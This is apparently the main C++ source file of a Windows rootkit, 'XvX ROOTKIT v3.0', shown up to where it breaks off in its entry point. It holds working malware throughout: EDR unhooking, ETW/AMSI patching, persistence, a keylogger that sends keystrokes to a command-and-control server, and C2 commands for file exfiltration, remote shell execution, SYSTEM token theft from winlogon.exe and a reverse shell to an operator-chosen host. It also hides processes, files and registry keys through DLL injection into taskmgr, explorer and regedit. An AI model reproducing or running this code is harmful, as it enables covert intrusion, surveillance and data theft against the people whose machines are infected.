#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <cstdio>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <tlhelp32.h>
#include "../include/Evasion.h"
#include "../include/IndirectSyscalls.h"
#include "../include/C2Client.h"
#include "../include/Keylogger.h"
#include "../include/Unhooking.h"
#include "../include/ETWAMSIBypass.h"
#include "../include/NamedPipePrivEsc.h"
#include "../include/Persistence.h"
#include "../include/DLLInjector.h"
#include "../include/IPCObjects_File.h"
#include "../include/Evasion.h"
#include "../include/DebugLog.h"
#include "../include/StringObfuscation.h"
#include "../include/HandleWrapper.h"
#include "../include/JitterSleep.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#ifndef _DEBUG
#define SILENT_MODE 1
#else
#define SILENT_MODE 0
#endif

HANDLE g_systemToken = NULL;
C2Client *g_c2Client = nullptr;

// Hiding vectors (synchronized with DLLs via memorymapped files)
vector<wstring> agentVector;    // Hidden processes
vector<wstring> pathVector;     // Hidden files/directories
vector<wstring> registryVector; // Hidden registry keys

struct InteractiveShell
{
    HANDLE hInputWrite = NULL;
    HANDLE hOutputRead = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    wstring outputBuffer;
    bool active = false;
    CRITICAL_SECTION cs;
} g_shell;

void InitShell()
{
    InitializeCriticalSection(&g_shell.cs);
}

bool StartInteractiveShell()
{
    if (g_shell.active)
        return true;
    if (g_shell.cs.DebugInfo == NULL)
        InitShell();

    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hOutputWrite = NULL, hInputRead = NULL;

    if (!CreatePipe(&g_shell.hOutputRead, &hOutputWrite, &sa, 0))
        return false;
    if (!CreatePipe(&hInputRead, &g_shell.hInputWrite, &sa, 0))
    {
        CloseHandle(g_shell.hOutputRead);
        CloseHandle(hOutputWrite);
        return false;
    }

    SetHandleInformation(g_shell.hOutputRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_shell.hInputWrite, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hInputRead;
    si.hStdOutput = hOutputWrite;
    si.hStdError = hOutputWrite;

    wstring cmdLine = wstring(L"cmd.exe") + L" /K chcp 65001 >nul && set LANG=en_US.UTF-8";
    BOOL success = FALSE;

    if (g_systemToken != NULL)
    {
        success = CreateProcessWithTokenW(g_systemToken, 0, NULL, (LPWSTR)cmdLine.c_str(),
                                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (!success)
        {
            success = CreateProcessAsUserW(g_systemToken, NULL, (LPWSTR)cmdLine.c_str(),
                                           NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        }
    }

    if (!success)
    {
        success = CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL, TRUE,
                                 CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);
    }

    if (!success)
    {
        CloseHandle(g_shell.hOutputRead);
        CloseHandle(hOutputWrite);
        CloseHandle(hInputRead);
        CloseHandle(g_shell.hInputWrite);
        return false;
    }

    CloseHandle(hOutputWrite);
    CloseHandle(hInputRead);
    g_shell.hProcess = pi.hProcess;
    g_shell.hThread = pi.hThread;
    g_shell.active = true;
    g_shell.outputBuffer.clear();

    return true;
}

// Read output from shell process via named pipe
wstring ReadShellOutput()
{
    if (!g_shell.active)
        return L"";

    EnterCriticalSection(&g_shell.cs);
    char buffer[4096];
    DWORD bytesRead;
    wstring output;
    UINT codepage = GetConsoleOutputCP();
    if (codepage == 0)
        codepage = CP_OEMCP;

    while (PeekNamedPipe(g_shell.hOutputRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0)
    {
        if (ReadFile(g_shell.hOutputRead, buffer, min(sizeof(buffer) - 1, (size_t)bytesRead), &bytesRead, NULL))
        {
            buffer[bytesRead] = '\0';
            int wlen = MultiByteToWideChar(codepage, 0, buffer, bytesRead, NULL, 0);
            if (wlen > 0)
            {
                wchar_t *wbuf = new wchar_t[wlen + 1];
                MultiByteToWideChar(codepage, 0, buffer, bytesRead, wbuf, wlen);
                wbuf[wlen] = L'\0';
                output += wbuf;
                delete[] wbuf;
            }
        }
        else
            break;
    }

    g_shell.outputBuffer += output;
    wstring result = g_shell.outputBuffer;
    g_shell.outputBuffer.clear();
    LeaveCriticalSection(&g_shell.cs);
    return result;
}

// Write command input to shell process stdin
void WriteShellInput(const wstring &cmd)
{
    if (!g_shell.active)
        return;

    EnterCriticalSection(&g_shell.cs);
    string cmdA(cmd.begin(), cmd.end());
    cmdA += "\r\n";
    DWORD bytesWritten;
    WriteFile(g_shell.hInputWrite, cmdA.c_str(), (DWORD)cmdA.size(), &bytesWritten, NULL);
    LeaveCriticalSection(&g_shell.cs);
}

bool StartSystemReverseShell(const char *host, int port);

struct ReverseShellParams
{
    char host[256];
    int port;
};

DWORD WINAPI ReverseShellThread(LPVOID param)
{
    ReverseShellParams *params = (ReverseShellParams *)param;
    StartSystemReverseShell(params->host, params->port);
    delete params;
    return 0;
}

// Create TCP reverse shell with SYSTEM privileges
bool StartSystemReverseShell(const char *host, int port)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return false;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        WSACleanup();
        return false;
    }

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    if (connect(sock, (sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    char cmdLine[] = "cmd.exe";
    BOOL success = FALSE;

    // Try to create process with SYSTEM token if available
    if (g_systemToken != NULL && g_systemToken != INVALID_HANDLE_VALUE)
    {
        success = CreateProcessWithTokenW(g_systemToken, 0, NULL,
                                          (LPWSTR)L"cmd.exe",
                                          CREATE_NO_WINDOW, NULL, NULL,
                                          (LPSTARTUPINFOW)&si, &pi);
        if (!success)
        {
            success = CreateProcessAsUserW(g_systemToken, NULL,
                                           (LPWSTR)L"cmd.exe",
                                           NULL, NULL, TRUE,
                                           CREATE_NO_WINDOW, NULL, NULL,
                                           (LPSTARTUPINFOW)&si, &pi);
        }
    }

    if (!success)
    {
        success = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    if (!success)
    {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    CloseHandle(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    closesocket(sock);
    WSACleanup();

    return true;
}

// Keylogger callback
void OnKeylogData(const wstring &keylog)
{
    LOG_INFO(wstring(L"Keylog callback - Size: ") + to_wstring(keylog.size()) + L" chars");

    if (g_c2Client == nullptr)
    {
        LOG_ERROR(L"g_c2Client is NULL!");
        return;
    }

    if (keylog.empty())
    {
        LOG_WARN(L"Empty keylog buffer, skipping");
        return;
    }

    // Generate unique ID with timestamp
    wstring commandID = L"keylog_" + to_wstring(GetTickCount64());

    // Send to C2 immediately
    g_c2Client->sendResult(commandID, L"success", keylog);

    LOG_SUCCESS(wstring(L"Sent to C2: ") + to_wstring(keylog.size()) + L" chars");
}

// Handle hide/unhide commands for processes, files, and registry
void processHidingCommand(const wstring &type, const wstring &action, const wstring &value = L"")
{
    if (type == L"process")
    {
        if (action == L"hide" && !value.empty())
        {
            try
            {
                agentVector = deserializeWStringVector(L"agentMapped");
            }
            catch (...)
            {
                agentVector.clear();
            }
            agentVector.push_back(value);
            Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
#ifdef _DEBUG
            wcout << L"[+] Process added to hide list: " << value << endl;
#endif

            DWORD taskmgrPID = getPIDbyProcName("taskmgr.exe");
            if (taskmgrPID != 0 && !isDLLLoaded(taskmgrPID, OBFUSCATE_W(L"processHooks.dll")))
            {
                wchar_t dllPath[MAX_PATH];
                GetModuleFileNameW(NULL, dllPath, MAX_PATH);
                wstring pathW(dllPath);
                size_t pos = pathW.find_last_of(L"\\");
                if (pos != wstring::npos)
                {
                    pathW = pathW.substr(0, pos) + OBFUSCATE_W(L"\\processHooks.dll");
                    if (injectDLL(pathW.c_str(), taskmgrPID))
                    {
#ifdef _DEBUG
                        wcout << L"[+] processHooks.dll injected into taskmgr.exe" << endl;
#endif
                    }
                }
            }
        }
        else if (action == L"unhide" && !value.empty())
        {
            try
            {
                agentVector = deserializeWStringVector(L"agentMapped");
                agentVector.erase(remove(agentVector.begin(), agentVector.end(), value), agentVector.end());
                Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
#ifdef _DEBUG
                wcout << L"[+] Process removed from hide list: " << value << endl;
#endif
            }
            catch (...)
            {
            }
        }
    }
    else if (type == L"file")
    {
        if (action == L"hide" && !value.empty())
        {
            try
            {
                pathVector = deserializeWStringVector(L"pathMapped");
            }
            catch (...)
            {
                pathVector.clear();
            }

            pathVector.push_back(value);
            Serialitzator::serializeVectorWString(pathVector, L"pathMapped");

#ifdef _DEBUG
            wcout << L"[+] Path added to hide list: " << value << endl;
#endif

            DWORD explorerPID = getPIDbyProcName("explorer.exe");
            if (explorerPID != 0 && !isDLLLoaded(explorerPID, OBFUSCATE_W(L"fileHooks.dll")))
            {
                wchar_t dllPath[MAX_PATH];
                GetModuleFileNameW(NULL, dllPath, MAX_PATH);
                wstring pathW(dllPath);
                size_t pos = pathW.find_last_of(L"\\");
                if (pos != wstring::npos)
                {
                    pathW = pathW.substr(0, pos) + OBFUSCATE_W(L"\\fileHooks.dll");
                    if (injectDLL(pathW.c_str(), explorerPID))
                    {
#ifdef _DEBUG
                        wcout << L"[+] fileHooks.dll injected into explorer.exe" << endl;
#endif
                    }
                }
            }
        }
        else if (action == L"unhide" && !value.empty())
        {
            try
            {
                pathVector = deserializeWStringVector(L"pathMapped");
                pathVector.erase(remove(pathVector.begin(), pathVector.end(), value), pathVector.end());
                Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
#ifdef _DEBUG
                wcout << L"[+] Path removed from hide list: " << value << endl;
#endif
            }
            catch (...)
            {
            }
        }
    }
    else if (type == L"registry")
    {
        if (action == L"hide" && !value.empty())
        {
            try
            {
                registryVector = deserializeWStringVector(L"registryMapped");
            }
            catch (...)
            {
                registryVector.clear();
            }

            registryVector.push_back(value);
            Serialitzator::serializeVectorWString(registryVector, L"registryMapped");

#ifdef _DEBUG
            wcout << L"[+] Registry key added to hide list: " << value << endl;
#endif

            DWORD regeditPID = getPIDbyProcName("regedit.exe");
            if (regeditPID != 0 && !isDLLLoaded(regeditPID, OBFUSCATE_W(L"registryHooks.dll")))
            {
                wchar_t dllPath[MAX_PATH];
                GetModuleFileNameW(NULL, dllPath, MAX_PATH);
                wstring pathW(dllPath);
                size_t pos = pathW.find_last_of(L"\\");
                if (pos != wstring::npos)
                {
                    pathW = pathW.substr(0, pos) + OBFUSCATE_W(L"\\registryHooks.dll");
                    if (injectDLL(pathW.c_str(), regeditPID))
                    {
#ifdef _DEBUG
                        wcout << L"[+] registryHooks.dll injected into regedit.exe" << endl;
#endif
                    }
                }
            }
        }
        else if (action == L"unhide" && !value.empty())
        {
            try
            {
                registryVector = deserializeWStringVector(L"registryMapped");
                registryVector.erase(remove(registryVector.begin(), registryVector.end(), value), registryVector.end());
                Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
#ifdef _DEBUG
                wcout << L"[+] Registry key removed from hide list: " << value << endl;
#endif
            }
            catch (...)
            {
            }
        }
    }
}

// C2 communication thread - beacon loop and command dispatcher
DWORD WINAPI c2ModeThread(LPVOID lpParam)
{
    C2Client *c2 = (C2Client *)lpParam;
    c2->setActive(true);

#ifdef _DEBUG
    wcout << L"[C2] Thread started" << endl;
#ifdef _DEBUG
    wcout << L"[C2] Beacon interval: 30 seconds (default)" << endl;
#endif
#ifdef _DEBUG
    wcout << L"[C2] Starting beacon loop..." << endl;
#endif
#endif

    int beaconCount = 0;
    while (c2->isRunning())
    {
        try
        {
            beaconCount++;
#ifdef _DEBUG
            wcout << L"\n[C2] ========== Beacon #" << beaconCount << L" ==========" << endl;
#ifdef _DEBUG
            wcout << L"[C2] Calling checkIn()..." << endl;
#endif
#endif

            vector<wstring> commands = c2->checkIn();

#ifdef _DEBUG
            wcout << L"[C2] checkIn() returned " << commands.size() << L" commands" << endl;
#endif

            for (const wstring &cmdLine : commands)
            {
                size_t pos = cmdLine.find(L'|');
                wstring cmd = (pos == wstring::npos) ? cmdLine : cmdLine.substr(0, pos);
                wstring args = (pos == wstring::npos) ? L"" : cmdLine.substr(pos + 1);
                wstring result;

                if (cmd == L"hide_process")
                {
                    processHidingCommand(L"process", L"hide", args);
                    result = L"SUCCESS|Process hidden: " + args;
                }
                else if (cmd == L"hide_file")
                {
                    processHidingCommand(L"file", L"hide", args);
                    result = L"SUCCESS|File/folder hidden: " + args;
                }
                else if (cmd == L"hide_registry")
                {
                    processHidingCommand(L"registry", L"hide", args);
                    result = L"SUCCESS|Registry key hidden: " + args;
                }
                else if (cmd == L"unhide_process")
                {
                    processHidingCommand(L"process", L"unhide", args);
                    result = L"SUCCESS|Process unhidden: " + args;
                }
                else if (cmd == L"unhide_file")
                {
                    processHidingCommand(L"file", L"unhide", args);
                    result = L"SUCCESS|File unhidden: " + args;
                }
                else if (cmd == L"unhide_registry")
                {
                    processHidingCommand(L"registry", L"unhide", args);
                    result = L"SUCCESS|Registry key unhidden: " + args;
                }
                else if (cmd == L"unhide_all")
                {
                    agentVector.clear();
                    pathVector.clear();
                    registryVector.clear();
                    Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
                    Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
                    Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
                    result = L"SUCCESS|All items unhidden";
                }

                // File operations
                else if (cmd == L"exfil")
                {
                    string filePathA(args.begin(), args.end());
                    ifstream file(filePathA, ios::binary);
                    if (file)
                    {
                        stringstream buffer;
                        buffer << file.rdbuf();
                        string dataA = buffer.str();
                        wstring data(dataA.begin(), dataA.end());
                        result = L"EXFIL|" + data;
                    }
                    else
                    {
                        result = L"ERROR|File not found: " + args;
                    }
                }
                else if (cmd == L"shell")
                {
                    wchar_t buffer[4096];
                    wstring cmdExec = wstring(L"cmd.exe") + L" /c " + args;
                    FILE *pipe = _wpopen(cmdExec.c_str(), L"r");
                    if (pipe)
                    {
                        wstring output;
                        while (fgetws(buffer, 4096, pipe))
                            output += buffer;
                        _pclose(pipe);
                        result = L"SHELL|" + output;
                    }
                    else
                    {
                        result = L"ERROR|Failed to execute command";
                    }
                }
                else if (cmd == L"sleep")
                {
                    DWORD seconds = (DWORD)_wtoi(args.c_str());
                    c2->setBeaconInterval(seconds);
                    result = L"Beacon interval set to " + args + L" seconds";
                }
                else if (cmd == L"privesc")
                {
                    // Try Named Pipe escalation first
                    if (NamedPipePrivEsc::EscalatePrivileges())
                    {
                        result = L"SUCCESS|Escalated to SYSTEM via Named Pipe";
                    }
                    else
                    {
                        // Fallback
                        result = L"INFO|Named Pipe failed, trying token stealing...";

                        // Enable SeDebugPrivilege
                        typedef BOOL(WINAPI * pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
                        typedef BOOL(WINAPI * pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
                        typedef BOOL(WINAPI * pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

                        auto fnOpenToken = (pOpenProcessToken)APIResolver::ResolveAPI(APIHash::OpenProcessToken);
                        auto fnLookup = (pLookupPrivilegeValueW)APIResolver::ResolveAPI(APIHash::LookupPrivilegeValueW);
                        auto fnAdjust = (pAdjustTokenPrivileges)APIResolver::ResolveAPI(APIHash::AdjustTokenPrivileges);

                        HANDLE hCurrentToken;
                        if (fnOpenToken && fnOpenToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken))
                        {
                            TOKEN_PRIVILEGES tp;
                            LUID luid;
                            if (fnLookup && fnLookup(NULL, L"SeDebugPrivilege", &luid))
                            {
                                tp.PrivilegeCount = 1;
                                tp.Privileges[0].Luid = luid;
                                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                                if (fnAdjust)
                                    fnAdjust(hCurrentToken, FALSE, &tp, sizeof(tp), NULL, NULL);
                            }
                            CloseHandle(hCurrentToken);
                        }

                        // Find winlogon.exe PID
                        DWORD winlogonPID = 0;
                        typedef HANDLE(WINAPI * pCreateToolhelp32Snapshot)(DWORD, DWORD);
                        auto fnSnapshot = (pCreateToolhelp32Snapshot)APIResolver::ResolveAPI(APIHash::CreateToolhelp32Snapshot);

                        if (fnSnapshot)
                        {
                            HANDLE hSnapshot = fnSnapshot(TH32CS_SNAPPROCESS, 0);
                            if (hSnapshot != INVALID_HANDLE_VALUE)
                            {
                                typedef BOOL(WINAPI * pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
                                typedef BOOL(WINAPI * pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
                                auto fnFirst = (pProcess32FirstW)APIResolver::ResolveAPI(APIHash::Process32FirstW);
                                auto fnNext = (pProcess32NextW)APIResolver::ResolveAPI(APIHash::Process32NextW);

                                PROCESSENTRY32W pe = {sizeof(pe)};
                                if (fnFirst && fnNext && fnFirst(hSnapshot, &pe))
                                {
                                    do
                                    {
                                        if (wcscmp(pe.szExeFile, L"winlogon.exe") == 0)
                                        {
                                            winlogonPID = pe.th32ProcessID;
                                            break;
                                        }
                                    } while (fnNext(hSnapshot, &pe));
                                }
                                CloseHandle(hSnapshot);
                            }
                        }

                        if (winlogonPID == 0)
                        {
                            result = L"ERROR|winlogon.exe not found";
                        }
                        else
                        {
                            // Open winlogon process with NtOpenProcess
                            struct
                            {
                                PVOID UniqueProcess;
                                PVOID UniqueThread;
                            } clientId;
                            clientId.UniqueProcess = (PVOID)(ULONG_PTR)winlogonPID;
                            clientId.UniqueThread = NULL;

                            struct
                            {
                                ULONG Length;
                                HANDLE RootDirectory;
                                PVOID ObjectName;
                                ULONG Attributes;
                                PVOID SecurityDescriptor;
                                PVOID SecurityQualityOfService;
                            } objAttr = {0};
                            objAttr.Length = sizeof(objAttr);

                            HANDLE hWinlogon = NULL;
                            NTSTATUS ntStatus = IndirectSyscalls::SysNtOpenProcess(&hWinlogon, PROCESS_QUERY_INFORMATION,
                                                                                   &objAttr, &clientId);

                            if (NT_SUCCESS(ntStatus) && hWinlogon)
                            {
                                HANDLE hToken = NULL, hNewToken = NULL;
                                typedef BOOL(WINAPI * pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
                                                                         SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
                                auto fnDuplicate = (pDuplicateTokenEx)APIResolver::ResolveAPI(APIHash::DuplicateTokenEx);

                                if (fnOpenToken && fnOpenToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
                                {
                                    if (fnDuplicate && fnDuplicate(hToken, MAXIMUM_ALLOWED, NULL,
                                                                   SecurityImpersonation, TokenPrimary, &hNewToken))
                                    {
                                        if (g_systemToken != NULL && g_systemToken != INVALID_HANDLE_VALUE)
                                            CloseHandle(g_systemToken);
                                        g_systemToken = hNewToken;

                                        // Impersonate SYSTEM
                                        if (ImpersonateLoggedOnUser(g_systemToken))
                                        {
                                            result = L"SUCCESS|Escalated to SYSTEM via token stealing";
                                        }
                                        else
                                        {
                                            result = L"ERROR|Failed to impersonate SYSTEM token";
                                        }
                                    }
                                    else
                                    {
                                        result = L"ERROR|Failed to duplicate token";
                                    }
                                    CloseHandle(hToken);
                                }
                                else
                                {
                                    result = L"ERROR|Failed to open winlogon token";
                                }
                                CloseHandle(hWinlogon);
                            }
                            else
                            {
                                result = L"ERROR|Failed to open winlogon process (NTSTATUS: " + to_wstring(ntStatus) + L")";
                            }
                        }
                    }
                }
                else if (cmd == L"revshell_system")
                {
                    // Launch TCP reverse shell with SYSTEM token
                    if (g_systemToken == NULL || g_systemToken == INVALID_HANDLE_VALUE)
                    {
                        result = L"ERROR|No SYSTEM token available. Run 'privesc' first.";
                    }
                    else
                    {
                        size_t colonPos = args.find(L':');
                        if (colonPos == wstring::npos)
                        {
                            result = L"ERROR|Invalid format. Use: host:port";
                        }
                        else
                        {
                            wstring hostW = args.substr(0, colonPos);
                            wstring portW = args.substr(colonPos + 1);

                            string host(hostW.begin(), hostW.end());
                            int port = _wtoi(portW.c_str());

                            if (port <= 0 || port > 65535)
                            {
                                result = L"ERROR|Invalid port number";
                            }
                            else
                            {
                                result = L"SUCCESS|Launching SYSTEM reverse shell to " + hostW + L":" + portW;
                                c2->sendResult(cmd, L"OK", result);

                                // Launch in separate thread to not block C2 beacon
                                ReverseShellParams *params = new ReverseShellParams();
                                strncpy(params->host, host.c_str(), sizeof(params->host) - 1);
                                params->host[sizeof(params->host) - 1] = '\0';
                                params->port = port;
                                CreateThread(NULL, 0, ReverseShellThread, params, 0, NULL);

                                continue;
                            }
                        }
                    }
                }
                else if (cmd == L"revshell_start")
                {
                    if (g_shell.active)
                    {
                        result = L"SUCCESS|Shell already active";
                    }
                    else
                    {
                        result = L"SUCCESS|Starting shell...";
                        c2->sendResult(cmd, L"OK", result);
                        try
                        {
                            if (!StartInteractiveShell())
                            {
                                c2->sendResult(cmd, L"ERROR", L"CreateProcess failed");
                            }
                        }
                        catch (...)
                        {
                            c2->sendResult(cmd, L"ERROR", L"Exception during shell start");
                        }
                        continue;
                    }
                }
                else if (cmd == L"revshell_stop")
                {
                    if (!g_shell.active)
                    {
                        result = L"SUCCESS|Shell not active";
                    }
                    else
                    {
                        EnterCriticalSection(&g_shell.cs);
                        if (g_shell.hInputWrite)
                            CloseHandle(g_shell.hInputWrite);
                        if (g_shell.hOutputRead)
                            CloseHandle(g_shell.hOutputRead);
                        if (g_shell.hProcess)
                        {
                            TerminateProcess(g_shell.hProcess, 0);
                            CloseHandle(g_shell.hProcess);
                        }
                        if (g_shell.hThread)
                            CloseHandle(g_shell.hThread);
                        g_shell.active = false;
                        g_shell.outputBuffer.clear();
                        LeaveCriticalSection(&g_shell.cs);
                        result = L"SUCCESS|Shell stopped";
                    }
                }
                else if (cmd == L"revshell_input")
                {
                    if (g_shell.active)
                    {
                        WriteShellInput(args);
                        wstring output;
                        bool gotOutput = false;

                        for (int i = 0; i < 40; i++)
                        {
                            JitterSleep(50);
                            wstring chunk = ReadShellOutput();
                            if (!chunk.empty())
                            {
                                output += chunk;
                                gotOutput = true;
                                JitterSleep(100);
                                output += ReadShellOutput();
                                JitterSleep(100);
                                output += ReadShellOutput();
                                JitterSleep(100);
                                output += ReadShellOutput();
                                break;
                            }
                        }

                        if (!gotOutput)
                        {
                            JitterSleep(500);
                            output = ReadShellOutput();
                            if (output.empty())
                            {
                                for (int i = 0; i < 5; i++)
                                {
                                    JitterSleep(200);
                                    wstring chunk = ReadShellOutput();
                                    if (!chunk.empty())
                                    {
                                        output += chunk;
                                        break;
                                    }
                                }
                            }
                        }

                        JitterSleep(100);
                        wstring final = ReadShellOutput();
                        if (!final.empty())
                            output += final;

                        result = output.empty() ? L"[No output - command may still be running]" : output;
                    }
                    else
                    {
                        result = L"ERROR|Shell not active - use revshell_start first";
                    }
                }
                else if (cmd == L"revshell_output")
                {
                    if (g_shell.active)
                    {
                        wstring output;
                        for (int i = 0; i < 20; i++)
                        {
                            JitterSleep(100);
                            wstring chunk = ReadShellOutput();
                            if (!chunk.empty())
                            {
                                output += chunk;
                                JitterSleep(200);
                                chunk = ReadShellOutput();
                                if (!chunk.empty())
                                    output += chunk;
                                break;
                            }
                        }
                        result = output.empty() ? L"[No output]" : output;
                    }
                    else
                    {
                        result = L"ERROR|Shell not active";
                    }
                }
                else if (cmd == L"die")
                {
                    c2->setActive(false);
                    result = L"Rootkit stopping";
                }
                else
                {
                    result = L"ERROR|Unknown command: " + cmd;
                }

                c2->sendResult(cmd, L"OK", result);
            }
        }
        catch (...)
        {
        }

        DWORD sleepTime = g_shell.active ? 1000 : c2->getBeaconInterval();
        Evasion::ObfuscatedSleep(sleepTime);
    }

    return 0;
}

// Main entry point - initialize da rootkit modules and C2 connection
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#ifdef _DEBUG
    // Allocate console ONLY in debug builds
    AllocConsole();
    FILE *fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
#else
    // Production: Close any inherited console
    FreeConsole();
#endif

    LOG_DEBUG(L"========================================");
    LOG_DEBUG(L"   XvX ROOTKIT v3.0 - STARTING");
    LOG_DEBUG(L"========================================");

    LOG_INFO(L"[1/8] Running evasion checks...");
    if (!Evasion::RunEvasionChecks())
    {
        LOG_FAIL(L"Evasion checks failed - exiting");
        return 0;
    }
    LOG_SUCCESS(L"Evasion checks passed");

    LOG_INFO(L"[2/8] Unhooking NTDLL...");
    UNHOOK_RESULT unhookResult;
    if (NTDLLUnhooker::UnhookNTDLL(&unhookResult))
    {
        LOG_SUCCESS(L"NTDLL unhooked (EDR bypass active)");
    }
    else
    {
        LOG_WARN(L"NTDLL unhooking failed, continuing anyway");
    }

    LOG_INFO(L"[3/8] Disabling telemetry (ETW/AMSI)...");
    if (TelemetryBypass::DisableTelemetry())
    {
        LOG_SUCCESS(L"Telemetry bypassed (ETW/AMSI patched)");
    }
    else
    {
        LOG_WARN(L"Telemetry bypass failed, continuing anyway");
    }

    LOG_DEBUG(L"\n========================================");
    LOG_DEBUG(L"  XvX Rootkit v3.0 - Active");
    LOG_DEBUG(L"========================================\n");
    LOG_INFO(L"[4/8] Starting rootkit initialization...");

    try
    {
        LOG_INFO(L"[5/8] Getting executable path...");

        WCHAR exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        wstring exePathW(exePath);

        LOG_SUCCESS(wstring(L"Path: ") + exePathW);
        LOG_INFO(L"[6/8] Initializing shell listener...");

        InitShell();
        LOG_SUCCESS(L"Shell initialized");
        LOG_INFO(L"Installing persistence...");

        Persistence::InstallPersistence(exePathW);
        LOG_SUCCESS(L"Persistence installed");
    }
    catch (...)
    {
        LOG_ERROR(L"Exception caught during initialization!");
#ifdef _DEBUG
        system("pause");
#endif
        return 1;
    }

    wstring c2URL = L"http://127.0.0.1:8080"; // Default fallback, overridden by c2_config.txt
    vector<wstring> c2URLs;

    // Try to read c2_config.txt from executable directory
    WCHAR exeDir[MAX_PATH];
    GetModuleFileNameW(NULL, exeDir, MAX_PATH);
    wstring exeDirW(exeDir);
    size_t lastSlash = exeDirW.find_last_of(L"\\/");
    if (lastSlash != wstring::npos)
    {
        exeDirW = exeDirW.substr(0, lastSlash + 1);
    }
    wstring configPathW = exeDirW + L"c2_config.txt";
    string configPath(configPathW.begin(), configPathW.end());

    ifstream configFile(configPath);
    if (configFile.is_open())
    {
        string line;
        while (getline(configFile, line))
        {
            if (line.empty() || line[0] == '#')
                continue;
            wstring url(line.begin(), line.end());
            c2URLs.push_back(url);
        }
        configFile.close();

#ifdef _DEBUG
        wcout << L"[+] Loaded C2 config from: " << configPathW << endl;
#ifdef _DEBUG
        wcout << L"[+] Found " << c2URLs.size() << L" C2 URLs" << endl;
#endif
#endif
    }
    else
    {
#ifdef _DEBUG
        wcout << L"[-] c2_config.txt not found: " << configPathW << endl;
#ifdef _DEBUG
        wcout << L"[*] Using default C2 URL" << endl;
#endif
#endif
    }

    if (c2URLs.empty())
        c2URLs.push_back(c2URL);

    bool c2Available = false;
    C2Client *c2 = nullptr;

    for (const auto &url : c2URLs)
    {
        c2 = new C2Client(url);
        c2Available = c2->testConnection();

        if (c2Available)
        {
            c2URL = url;
#ifdef _DEBUG
            wcout << L"[+] C2 available: " << c2URL << endl;
#ifdef _DEBUG
            wcout << L"[+] Agent ID: " << c2->getAgentID() << endl;
#endif
#endif
            break;
        }
        else
        {
#ifdef _DEBUG
            wcout << L"[-] Connection failed: " << url << endl;
#endif
            delete c2;
            c2 = nullptr;
        }
    }

    if (c2Available && c2)
    {
        g_c2Client = c2;

        // Start keylogger FIRST before C2 thread floods logs
#ifdef _DEBUG
        wcout << L"[7/8] Starting keylogger..." << endl;
#endif

        try
        {
            if (Keylogger::Start(OnKeylogData))
            {
#ifdef _DEBUG
                wcout << L"[OK] Keylogger started with C2 exfiltration" << endl;
#endif
            }
            else
            {
#ifdef _DEBUG
                wcout << L"[FAIL] Keylogger::Start() returned false" << endl;
#endif
            }
        }
        catch (...)
        {
#ifdef _DEBUG
            wcout << L"[EXCEPTION] Keylogger error" << endl;
#endif
        }

        JitterSleep(500);

        // Start C2 thread AFTER keylogger
#ifdef _DEBUG
        wcout << L"[8/8] Starting C2 communication thread..." << endl;
#endif

